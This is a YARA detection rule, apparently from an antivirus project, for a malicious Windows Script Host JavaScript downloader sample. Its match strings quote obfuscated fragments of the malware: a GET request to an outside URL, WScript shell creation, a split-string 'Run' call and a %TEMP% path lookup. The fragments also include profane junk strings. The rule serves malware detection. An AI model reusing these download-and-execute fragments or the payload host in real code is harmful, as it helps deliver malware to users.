rule sig_20160428_8acef063f05c0aa079f82d88872b8713 {
  meta:
    description = "datamaliciousorder - file 20160428_8acef063f05c0aa079f82d88872b8713.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80751d7d3153961be016b63e3675e2d19790bdaaf323d40aa50434b1129918ac"

  strings:
    $s1  = "JypTggFkuJruOtsUrcOvq[ZftOwjLrjPoyTeaJzjIet](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function XbcNgqDhdVliAebUpkSjk(YmwAkpEjpGzyFctPwaTml){XzgRsoStmRzeGqoCgnQzn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UjbUnvSksOdpDphAqlQgr() {return XzgRsoStmRzeGqoCgnQzn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function XbcNgqDhdVliAebUpkSjk(YmwAkpEjpGzyFctPwaTml){XzgRsoStmRzeGqoCgnQzn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var XzgRsoStmRzeGqoCgnQzn = function OjzOesClrZznLfvUqmGpu() {return VxfMphDqkMqnApgGlpNkx[BnjUviEgkLflPmbRibOqz](\"WScript\"+\"" ascii
    $s6  = "var VxfMphDqkMqnApgGlpNkx = this[\"WScript\"];" fullword ascii
    $s7  = "var XzgRsoStmRzeGqoCgnQzn = function OjzOesClrZznLfvUqmGpu() {return VxfMphDqkMqnApgGlpNkx[BnjUviEgkLflPmbRibOqz](\"WScript\"+\"" ascii
    $s8  = "function UjbUnvSksOdpDphAqlQgr() {return XzgRsoStmRzeGqoCgnQzn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function JdkEatMbzHqnCmxMwlAwh(BseJhcQtlLrkMlvPbgAkg, CazYfhLqgAduFgxPygNho){XzfZacKdsKjhYzdAseDiz = XzfZacKdsKjhYzdAseDiz * 1; " ascii
    $s10 = "if (JypTggFkuJruOtsUrcOvq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "return BseJhcQtlLrkMlvPbgAkg - CazYfhLqgAduFgxPygNho;};" fullword ascii
    $s12 = "function NvrIokBhwTabDvcTsiAvy(){return NdnFnpAsrImnDioTlwGmc + \"\";};" fullword ascii
    $s13 = "function OpeSnqUyfHqnNxqBylFdu() {return ((JxcJtzRdoRpqHkuKldNhw == true) && (JxcJtzRdoRpqHkuKldNhw == EosMnpCfnAnzIzrVnsXwo)) ?" ascii
    $s14 = "function OpeSnqUyfHqnNxqBylFdu() {return ((JxcJtzRdoRpqHkuKldNhw == true) && (JxcJtzRdoRpqHkuKldNhw == EosMnpCfnAnzIzrVnsXwo)) ?" ascii
    $s15 = "function WqxKypVenMowUdsLxyMrm(){return 23;};" fullword ascii
    $s16 = "function JdkEatMbzHqnCmxMwlAwh(BseJhcQtlLrkMlvPbgAkg, CazYfhLqgAduFgxPygNho){XzfZacKdsKjhYzdAseDiz = XzfZacKdsKjhYzdAseDiz * 1; " ascii
    $s17 = "return JdkEatMbzHqnCmxMwlAwh(1 == 1 ? TozCdvDdsSiqZonBxhDpq : 0, 1 == 1 ? YtxFwqKouNtaLjwDprLlu : 0);" fullword ascii
    $s18 = "var EosMnpCfnAnzIzrVnsXwo = false;" fullword ascii
    $s19 = "function OhrBwpNycYotScnEpzXvn(JcbWqsLbnGfjBtkKocIkm) {var WdvJxuLvfShwFlwTyaFcx = (1, 2, 3, 4, 5, JcbWqsLbnGfjBtkKocIkm); retur" ascii
    $s20 = "JxcJtzRdoRpqHkuKldNhw = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}